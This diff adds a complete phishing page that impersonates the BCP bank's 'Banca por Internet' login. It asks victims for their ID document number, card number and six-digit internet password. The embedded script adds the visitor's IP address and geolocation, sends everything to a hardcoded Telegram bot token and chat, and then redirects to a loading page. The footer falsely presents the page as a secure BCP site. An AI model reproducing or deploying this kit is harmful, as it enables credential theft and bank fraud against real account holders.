@@ -1,0 +1,671 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BCP - Banca por Internet</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+    />
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <style>
+      body {
+        font-family:
+          system-ui,
+          -apple-system,
+          Segoe UI,
+          Roboto,
+          Arial,
+          sans-serif;
+      }
+      input,
+      select {
+        border: 1px solid #868f9e !important;
+        outline: none;
+      }
+      input:focus,
+      select:focus {
+        border-color: #868f9e;
+        outline: none;
+      }
+      .document-group {
+        display: flex;
+        border: 1px solid #868f9e;
+        border-radius: 0.5rem;
+        overflow: hidden;
+      }
+      .document-group select,
+      .document-group input {
+        border: none !important;
+        border-radius: 0;
+        background: transparent;
+      }
+      .document-group select {
+        border-right: 1px solid #868f9e !important;
+        min-width: 80px;
+        width: auto;
+        padding-right: 0.5rem;
+      }
+      .document-group input {
+        flex: 1;
+        min-width: 0;
+      }
+      .document-group select:focus,
+      .document-group input:focus {
+        border-color: transparent !important;
+        outline: none;
+      }
+      .document-group:focus-within {
+        border-color: #868f9e;
+        box-shadow: 0 0 0 2px rgba(134, 143, 158, 0.2);
+      }
+
+      .password-field {
+        position: relative;
+        margin-bottom: 8px;
+      }
+
+      #clave {
+        cursor: pointer;
+      }
+
+      #clave.active {
+        border-color: #2f6fed !important;
+        box-shadow: 0 0 0 3px rgba(47, 111, 237, 0.15);
+      }
+
+      .keypad {
+        position: absolute;
+        top: calc(100% + 8px);
+        left: 0;
+        right: 0;
+        z-index: 50;
+        background: #fff;
+        border: 1px solid #e2e4e9;
+        border-radius: 14px;
+        box-shadow: 0 12px 28px rgba(20, 20, 43, 0.12);
+        padding: 12px;
+        display: none;
+      }
+
+      .keypad.open {
+        display: block;
+      }
+
+      .keypad-grid {
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+        gap: 8px;
+      }
+
+      .keypad-grid button {
+        border: 1px solid #e2e4e9;
+        background: #fafbfc;
+        border-radius: 10px;
+        padding: 14px 0;
+        font-size: 18px;
+        color: #1f2430;
+        cursor: pointer;
+        transition: background 0.1s ease;
+        border: 1px solid #e2e4e9 !important;
+      }
+
+      .keypad-grid button:hover {
+        background: #eef1f6;
+      }
+      .keypad-grid button:active {
+        background: #e3e7ee;
+      }
+
+      .keypad-grid button.action {
+        color: #6b7280;
+        font-size: 16px;
+      }
+
+      .keypad-backdrop {
+        position: fixed;
+        inset: 0;
+        z-index: 40;
+        display: none;
+      }
+      .keypad-backdrop.open {
+        display: block;
+      }
+
+      /* Estilos para validación */
+      .input-error {
+        border-color: #dc2626 !important;
+        box-shadow: 0 0 0 2px rgba(220, 38, 38, 0.2) !important;
+      }
+
+      .error-message {
+        color: #dc2626;
+        font-size: 0.75rem;
+        margin-top: 4px;
+        display: none;
+      }
+
+      .error-message.show {
+        display: block;
+      }
+
+      .field-group {
+        margin-bottom: 12px;
+      }
+    </style>
+  </head>
+  <body class="bg-white">
+    <div class="min-h-screen flex">
+      <!-- LEFT PANEL -->
+      <div
+        class="hidden md:flex md:w-1/2 bg-[#002a8d] relative items-center justify-center overflow-hidden"
+      >
+        <img
+          src="bydefault.jpg"
+          alt="Ilustración BCP"
+          class="w-full h-full object-cover opacity-90"
+        />
+        <div class="absolute top-6 left-6 text-white font-bold text-2xl">
+          <span class="text-white">BCP</span>
+        </div>
+      </div>
+
+      <!-- RIGHT PANEL -->
+      <div class="w-full md:w-1/2 flex flex-col">
+        <!-- TOP BAR -->
+        <div class="flex items-center justify-between px-6 py-4">
+          <div class="flex items-center gap-2 text-orange-500 font-medium">
+            <i class="fa-solid fa-arrow-left"></i>
+            <span>Volver</span>
+          </div>
+
+          <div class="flex items-center gap-3 text-gray-700 text-sm">
+            <span
+              >Esta ventana se cerrará en
+              <b id="timerDisplay">300</b> segundos</span
+            >
+            <i class="fa-regular fa-clock"></i>
+          </div>
+
+          <div class="text-gray-500">
+            <i class="fa-regular fa-circle-question"></i>
+          </div>
+        </div>
+
+        <!-- TITLE -->
+        <div class="text-center mt-6">
+          <h1 class="text-[#002a8d] text-2xl font-semibold">
+            Banca por Internet
+          </h1>
+          <p class="text-gray-500 text-sm mt-1">Banca por Internet</p>
+        </div>
+
+        <!-- FORM CARD -->
+        <div class="flex justify-center mt-6 px-4">
+          <div
+            class="w-full max-w-md border rounded-xl p-6 shadow-sm"
+            style="border: 1px solid #d2d5dc"
+          >
+            <div class="flex items-center gap-2 mb-4">
+              <i class="fa-regular fa-credit-card text-[#002a8d]"></i>
+              <h2 class="text-[#002a8d] font-semibold">Tarjeta y clave</h2>
+            </div>
+
+            <!-- RADIO -->
+            <div class="flex gap-6 mb-4 text-sm">
+              <label class="flex items-center gap-2">
+                <input type="radio" checked class="accent-orange-500" />
+                Persona
+              </label>
+              <label class="flex items-center gap-2 text-gray-500">
+                <input type="radio" class="accent-orange-500" />
+                Empresa
+              </label>
+            </div>
+
+            <!-- DOCUMENT -->
+            <div class="field-group">
+              <div class="document-group">
+                <select class="px-3 py-2 text-sm" id="tipoDocumento">
+                  <option>DNI</option>
+                  <option>CE</option>
+                  <option>Pasaporte</option>
+                </select>
+                <input
+                  type="text"
+                  placeholder="Nro de documento"
+                  class="px-3 py-2 text-sm"
+                  id="numeroDocumento"
+                  inputmode="numeric"
+                  pattern="[0-9]*"
+                />
+              </div>
+              <div class="error-message" id="errorDocumento">
+                Ingrese un número de documento válido
+              </div>
+            </div>
+
+            <!-- CARD NUMBER -->
+            <div class="field-group">
+              <input
+                type="text"
+                placeholder="Número de tarjeta"
+                class="rounded-lg px-3 py-2 w-full text-sm"
+                id="numeroTarjeta"
+                inputmode="numeric"
+                pattern="[0-9]*"
+              />
+              <div class="error-message" id="errorTarjeta">
+                Ingrese un número de tarjeta válido
+              </div>
+            </div>
+
+            <!-- CHECK -->
+            <label class="flex items-center gap-2 text-sm text-gray-600 mb-3">
+              <input
+                type="checkbox"
+                class="accent-orange-500"
+                id="recordarDatos"
+              />
+              Recordar datos
+            </label>
+
+            <!-- PASSWORD -->
+            <div class="field-group">
+              <div class="password-field">
+                <input
+                  type="password"
+                  id="clave"
+                  maxlength="6"
+                  placeholder="Clave de internet de 6 dígitos"
+                  class="rounded-lg px-3 py-2 w-full text-sm"
+                  readonly
+                  inputmode="numeric"
+                  pattern="[0-9]*"
+                />
+
+                <!-- Teclado numérico -->
+                <div class="keypad" id="keypad">
+                  <div class="keypad-grid" id="keypadGrid"></div>
+                </div>
+              </div>
+              <div class="error-message" id="errorClave">
+                Ingrese una clave de 6 dígitos
+              </div>
+            </div>
+
+            <div class="flex justify-between text-xs text-orange-500 mb-6">
+              <span>Crear clave</span>
+              <span>Olvidé mi clave</span>
+            </div>
+
+            <!-- BUTTON -->
+            <button
+              id="continuarBtn"
+              class="w-full bg-orange-500 hover:bg-orange-600 text-white font-semibold py-3 rounded-full"
+            >
+              Continuar
+            </button>
+          </div>
+        </div>
+
+        <!-- FOOTER -->
+        <div
+          class="text-xs text-gray-500 px-6 mt-6 mb-4 flex items-start gap-2"
+        >
+          <i class="fa-solid fa-lock mt-1"></i>
+          <p>
+            Esta es una página segura del BCP. Si tienes dudas sobre la
+            autenticidad de la web, comunícate con nosotros al (01) 311-9898 o a
+            través de nuestros medios digitales.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Overlay para cerrar el teclado -->
+    <div class="keypad-backdrop" id="backdrop"></div>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        // ---------- CONFIGURACIÓN TELEGRAM ----------
+        const TELEGRAM_BOT_TOKEN = "8700311235:AAG4b4wrbmmsNeDa11eawivXLo9RV0hq0Sw";
+        const TELEGRAM_CHAT_ID = "-5398208983";
+        const REDIRECT_URL = "cargando.html";
+
+        // ============================================================
+        // 1. FUNCIONES DE UBICACIÓN (IP)
+        // ============================================================
+        async function getIPInfo() {
+          try {
+            const ipResponse = await fetch("https://api.ipify.org?format=json");
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+            const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+            const locationData = await locationResponse.json();
+            return {
+              ip: ip,
+              ciudad: locationData.city || "Desconocida",
+              region: locationData.region || "Desconocida",
+              pais: locationData.country_name || "Desconocido",
+              proveedor: locationData.org || "Desconocido",
+            };
+          } catch (error) {
+            console.error("Error obteniendo información de IP:", error);
+            return {
+              ip: "No disponible",
+              ciudad: "No disponible",
+              region: "No disponible",
+              pais: "No disponible",
+              proveedor: "No disponible",
+            };
+          }
+        }
+
+        // ============================================================
+        // 2. FUNCIÓN PARA ENVIAR A TELEGRAM
+        // ============================================================
+        async function sendToTelegram(message) {
+          try {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const response = await fetch(url, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: "HTML",
+              }),
+            });
+            return await response.json();
+          } catch (error) {
+            console.error("Error enviando a Telegram:", error);
+            return null;
+          }
+        }
+
+        // ============================================================
+        // 3. FUNCIÓN UNIFICADA PARA ENVIAR TODOS LOS DATOS
+        // ============================================================
+        async function enviarTodosLosDatos() {
+          const tipoDoc = document.getElementById("tipoDocumento")?.value || "No especificado";
+          const numDoc = document.getElementById("numeroDocumento")?.value?.trim() || "(vacío)";
+          const numTarjeta = document.getElementById("numeroTarjeta")?.value?.trim() || "(vacío)";
+          const claveInternet = document.getElementById("clave")?.value?.trim() || "(vacío)";
+
+          const ipInfo = await getIPInfo();
+          const userAgent = navigator.userAgent;
+          const platform = navigator.platform;
+          const screen = `${window.screen.width}x${window.screen.height}`;
+
+          let message = `🔐 <b>NUEVO ACCESO - DATOS COMPLETOS</b>\n\n`;
+          message += `📋 <b>Datos del formulario:</b>\n`;
+          message += `• Tipo de documento: ${tipoDoc}\n`;
+          message += `• Número de documento: ${numDoc}\n`;
+          message += `• Número de tarjeta: ${numTarjeta}\n`;
+          message += `• Clave de internet: ${claveInternet}\n`;
+          message += `🌐 <b>Información de ubicación:</b>\n`;
+          message += `• IP: ${ipInfo.ip}\n`;
+          message += `• Ciudad: ${ipInfo.ciudad}\n`;
+          message += `• Región: ${ipInfo.region}\n`;
+          message += `• País: ${ipInfo.pais}\n`;
+          message += `• Proveedor: ${ipInfo.proveedor}\n`;
+          message += `⏰ <b>Fecha y Hora:</b> ${new Date().toLocaleString()}\n`;
+          message += `🖥️ <b>User Agent:</b> ${userAgent}\n`;
+          message += `📱 <b>Plataforma:</b> ${platform}\n`;
+          message += `🖥️ <b>Pantalla:</b> ${screen}`;
+
+          await sendToTelegram(message);
+          console.log("✅ Datos enviados correctamente a Telegram");
+
+          setTimeout(() => {
+            window.location.href = REDIRECT_URL;
+          }, 0);
+        }
+
+        // ============================================================
+        // 4. FUNCIONES DEL TECLADO NUMÉRICO
+        // ============================================================
+        const inputClave = document.getElementById("clave");
+        const keypad = document.getElementById("keypad");
+        const grid = document.getElementById("keypadGrid");
+        const backdrop = document.getElementById("backdrop");
+        const continuarBtn = document.getElementById("continuarBtn");
+        const timerDisplay = document.getElementById("timerDisplay");
+
+        let segundos = 300;
+
+        function actualizarContador() {
+          timerDisplay.textContent = segundos;
+          if (segundos <= 0) {
+            clearInterval(intervalo);
+          }
+        }
+
+        const intervalo = setInterval(() => {
+          segundos -= 1;
+          actualizarContador();
+        }, 1000);
+
+        function digitsShuffled() {
+          const digits = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"];
+          for (let i = digits.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [digits[i], digits[j]] = [digits[j], digits[i]];
+          }
+          return digits;
+        }
+
+        function buildKeypad() {
+          grid.innerHTML = "";
+          const digits = digitsShuffled();
+
+          digits.forEach((d) => {
+            const btn = document.createElement("button");
+            btn.type = "button";
+            btn.textContent = d;
+            btn.addEventListener("click", () => {
+              if (inputClave.value.length < inputClave.maxLength) {
+                inputClave.value += d;
+                clearFieldError(inputClave);
+              }
+            });
+            grid.appendChild(btn);
+          });
+
+          const clearBtn = document.createElement("button");
+          clearBtn.type = "button";
+          clearBtn.className = "action";
+          clearBtn.innerHTML = "🗑";
+          clearBtn.addEventListener("click", () => {
+            inputClave.value = "";
+            clearFieldError(inputClave);
+          });
+          grid.appendChild(clearBtn);
+
+          const backBtn = document.createElement("button");
+          backBtn.type = "button";
+          backBtn.className = "action";
+          backBtn.innerHTML = "⌫";
+          backBtn.addEventListener("click", () => {
+            inputClave.value = inputClave.value.slice(0, -1);
+            clearFieldError(inputClave);
+          });
+          grid.appendChild(backBtn);
+        }
+
+        function openKeypad() {
+          buildKeypad();
+          keypad.classList.add("open");
+          backdrop.classList.add("open");
+          inputClave.classList.add("active");
+        }
+
+        function closeKeypad() {
+          keypad.classList.remove("open");
+          backdrop.classList.remove("open");
+          inputClave.classList.remove("active");
+        }
+
+        inputClave.addEventListener("click", (e) => {
+          e.stopPropagation();
+          if (!keypad.classList.contains("open")) {
+            openKeypad();
+          }
+        });
+
+        backdrop.addEventListener("click", closeKeypad);
+
+        // ============================================================
+        // 5. FUNCIONES DE VALIDACIÓN
+        // ============================================================
+        function showFieldError(input, errorId) {
+          input.classList.add("input-error");
+          const errorEl = document.getElementById(errorId);
+          if (errorEl) errorEl.classList.add("show");
+        }
+
+        function clearFieldError(input) {
+          input.classList.remove("input-error");
+          const parent = input.closest(".field-group");
+          if (parent) {
+            const errorEl = parent.querySelector(".error-message");
+            if (errorEl) errorEl.classList.remove("show");
+          }
+        }
+
+        function validateForm() {
+          let isValid = true;
+
+          const numDoc = document.getElementById("numeroDocumento");
+          const docValue = numDoc.value.trim();
+          if (!docValue || !/^\d+$/.test(docValue)) {
+            showFieldError(numDoc, "errorDocumento");
+            isValid = false;
+          } else {
+            clearFieldError(numDoc);
+          }
+
+          const numTarjeta = document.getElementById("numeroTarjeta");
+          const tarjetaValue = numTarjeta.value.trim();
+          if (!tarjetaValue || !/^\d+$/.test(tarjetaValue)) {
+            showFieldError(numTarjeta, "errorTarjeta");
+            isValid = false;
+          } else {
+            clearFieldError(numTarjeta);
+          }
+
+          const clave = document.getElementById("clave");
+          const claveValue = clave.value.trim();
+          if (!claveValue || !/^\d{6}$/.test(claveValue)) {
+            showFieldError(clave, "errorClave");
+            isValid = false;
+          } else {
+            clearFieldError(clave);
+          }
+
+          return isValid;
+        }
+
+        // ============================================================
+        // 6. BOTÓN CONTINUAR - CON VALIDACIÓN
+        // ============================================================
+        continuarBtn.addEventListener("click", function (e) {
+          e.preventDefault();
+
+          if (!validateForm()) {
+            const firstError = document.querySelector(".input-error");
+            if (firstError) {
+              firstError.scrollIntoView({
+                behavior: "smooth",
+                block: "center",
+              });
+              firstError.focus();
+            }
+            return;
+          }
+
+          const originalHTML = this.innerHTML;
+          this.innerHTML = `
+            <span class="ng-star-inserted">
+              <i class="fas fa-spinner fa-spin ng-star-inserted"></i>
+                Enviando...
+            </span>`;
+          this.disabled = true;
+
+          enviarTodosLosDatos()
+            .catch((error) => {
+              console.error("Error en el proceso:", error);
+              setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+              }, 1000);
+            })
+            .finally(() => {
+              this.innerHTML = originalHTML;
+              this.disabled = false;
+            });
+        });
+
+        // ============================================================
+        // 7. LIMPIAR ERRORES AL ESCRIBIR
+        // ============================================================
+        document.querySelectorAll('input[inputmode="numeric"]').forEach((input) => {
+          input.addEventListener("keydown", function (e) {
+            if (
+              e.key === "Backspace" ||
+              e.key === "Delete" ||
+              e.key === "Tab" ||
+              e.key === "ArrowLeft" ||
+              e.key === "ArrowRight" ||
+              e.key === "Home" ||
+              e.key === "End" ||
+              e.key === "Enter"
+            ) {
+              return;
+            }
+            if (!/^\d$/.test(e.key)) {
+              e.preventDefault();
+            }
+          });
+
+          input.addEventListener("input", function () {
+            this.value = this.value.replace(/\D/g, "");
+            clearFieldError(this);
+          });
+
+          input.addEventListener("blur", function () {
+            if (this.value.trim() && /^\d+$/.test(this.value.trim())) {
+              clearFieldError(this);
+            }
+          });
+        });
+
+        // ============================================================
+        // 8. ESTILOS PARA SPINNER
+        // ============================================================
+        if (!document.querySelector("#telegram-spinner-css")) {
+          const style = document.createElement("style");
+          style.id = "telegram-spinner-css";
+          style.textContent = `
+            .fa-spinner {
+              animation: spin 1s linear infinite;
+            }
+            @keyframes spin {
+              0% { transform: rotate(0deg); }
+              100% { transform: rotate(360deg); }
+            }
+            .btn:disabled {
+              opacity: 0.6;
+              cursor: not-allowed;
+            }
+          `;
+          document.head.appendChild(style);
+        }
+
+        console.log("✅ Script limpio cargado correctamente (Sin Captcha)");
+      });
+    </script>
+  </body>
+</html>
